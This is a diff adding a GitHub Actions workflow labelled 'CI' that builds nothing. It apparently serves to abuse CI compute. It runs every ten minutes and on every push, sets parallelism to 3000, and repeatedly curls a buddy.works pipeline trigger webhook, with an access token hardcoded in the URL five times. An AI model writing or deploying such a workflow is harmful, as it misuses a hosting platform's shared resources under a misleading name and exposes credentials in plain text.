@@ -1,0 +1,32 @@
+name: CI 
+on:  
+  push:
+  pull_request:
+  workflow_dispatch:  
+  schedule:
+  - cron: "*/10 * * * *"
+  
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 3000
+      fail-fast: false
+      matrix:
+        go: [1.1]
+        flag: [A]
+    env:
+        NUM_JOBS: 1000
+        JOB: ${{ matrix.go }}
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a one-line script
+        run: curl -X POST https://app.buddy.works/nineballku5/polaaa/pipelines/pipeline/503604/trigger-webhook?token=db1f7d6e8cc90028b434f2457668178e0dc1faf6aef296dfdeb0e04a7fbcdfec0dc5e8ba13f4abb1f520d7aa16c547c2
+      - name: Run a one-line script
+        run: curl -X POST https://app.buddy.works/nineballku5/polaaa/pipelines/pipeline/503604/trigger-webhook?token=db1f7d6e8cc90028b434f2457668178e0dc1faf6aef296dfdeb0e04a7fbcdfec0dc5e8ba13f4abb1f520d7aa16c547c2
+      - name: Run a one-line script
+        run: curl -X POST https://app.buddy.works/nineballku5/polaaa/pipelines/pipeline/503604/trigger-webhook?token=db1f7d6e8cc90028b434f2457668178e0dc1faf6aef296dfdeb0e04a7fbcdfec0dc5e8ba13f4abb1f520d7aa16c547c2
+      - name: Run a one-line script
+        run: curl -X POST https://app.buddy.works/nineballku5/polaaa/pipelines/pipeline/503604/trigger-webhook?token=db1f7d6e8cc90028b434f2457668178e0dc1faf6aef296dfdeb0e04a7fbcdfec0dc5e8ba13f4abb1f520d7aa16c547c2
+      - name: Run a one-line script
+        run: curl -X POST https://app.buddy.works/nineballku5/polaaa/pipelines/pipeline/503604/trigger-webhook?token=db1f7d6e8cc90028b434f2457668178e0dc1faf6aef296dfdeb0e04a7fbcdfec0dc5e8ba13f4abb1f520d7aa16c547c2
